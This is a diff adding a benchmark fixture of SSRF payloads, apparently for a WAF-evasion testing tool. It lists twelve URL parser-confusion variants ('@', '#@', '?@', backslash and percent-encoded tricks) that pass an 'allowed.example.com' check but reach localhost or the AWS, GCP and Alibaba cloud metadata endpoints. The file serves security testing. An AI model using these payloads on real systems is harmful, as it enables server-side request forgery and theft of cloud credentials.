@@ -1,0 +1,71 @@
+schema = 1
+# Parser-confusion authority bypass — Orange Tsai 2017 class.
+#
+# Each case is a URL that a typical "validator" (Python urllib, Ruby URI,
+# Java URL, Go net/url, libcurl, PHP parse_url) parses with host
+# `allowed.example.com`, but the *fetcher* (Net::HTTP, requests, Apache
+# HttpClient, etc.) hits the internal target embedded after `@`, `#@`,
+# query-userinfo, backslash, percent-encoded `@`, etc. Wafrift's
+# ssrf::mutate now generates this whole family from any user-supplied
+# URL, so these cases anchor the bench against the canonical Tsai
+# variants we expect to fire.
+
+[[case]]
+id = "tsai_basic_userinfo"
+class = "ssrf"
+payload = "http://allowed.example.com@127.0.0.1/"
+
+[[case]]
+id = "tsai_fragment_userinfo_gitlab_cve"
+class = "ssrf"
+payload = "http://allowed.example.com#@127.0.0.1/"
+
+[[case]]
+id = "tsai_query_userinfo"
+class = "ssrf"
+payload = "http://allowed.example.com?@127.0.0.1/"
+
+[[case]]
+id = "tsai_backslash_userinfo"
+class = "ssrf"
+payload = "http://allowed.example.com\\@127.0.0.1/"
+
+[[case]]
+id = "tsai_double_backslash"
+class = "ssrf"
+payload = "http://allowed.example.com\\\\@127.0.0.1/"
+
+[[case]]
+id = "tsai_percent_at"
+class = "ssrf"
+payload = "http://allowed.example.com%40127.0.0.1/"
+
+[[case]]
+id = "tsai_double_percent_at"
+class = "ssrf"
+payload = "http://allowed.example.com%2540127.0.0.1/"
+
+[[case]]
+id = "tsai_port_then_userinfo"
+class = "ssrf"
+payload = "http://allowed.example.com:80@127.0.0.1/"
+
+[[case]]
+id = "tsai_path_relative_at"
+class = "ssrf"
+payload = "http://allowed.example.com/@127.0.0.1/"
+
+[[case]]
+id = "tsai_userinfo_metadata_aws"
+class = "ssrf"
+payload = "http://allowed.example.com@169.254.169.254/latest/meta-data/"
+
+[[case]]
+id = "tsai_fragment_userinfo_metadata_gcp"
+class = "ssrf"
+payload = "http://allowed.example.com#@metadata.google.internal/computeMetadata/v1/"
+
+[[case]]
+id = "tsai_userinfo_alibaba_metadata"
+class = "ssrf"
+payload = "http://allowed.example.com@100.100.100.200/latest/meta-data/"
